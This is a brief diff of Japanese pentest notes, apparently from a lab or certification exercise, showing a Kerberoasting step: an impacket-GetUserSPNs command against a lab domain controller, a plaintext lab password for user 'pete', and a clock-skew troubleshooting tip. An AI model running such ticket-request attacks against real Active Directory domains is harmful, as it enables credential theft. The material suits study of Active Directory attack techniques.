@@ -14,6 +14,7 @@ sudo impacket-GetUserSPNs -request -dc-ip 192.168.158.70 corp.com/pete
 ```
 - peteのパスワード Nexus123!
 - impacket-GetUserSPNs が「KRB_AP_ERR_SKEW(クロックのずれが大きすぎます)」というエラーをスローした場合、Kali マシンの時刻をドメインコントローラと同期する必要があります。ntpdate またはrdate を使用できます。
+
 ```
 ServicePrincipalName    Name         MemberOf  PasswordLastSet             LastLogon                   Delegation    
 ----------------------  -----------  --------  --------------------------  --------------------------  -------------
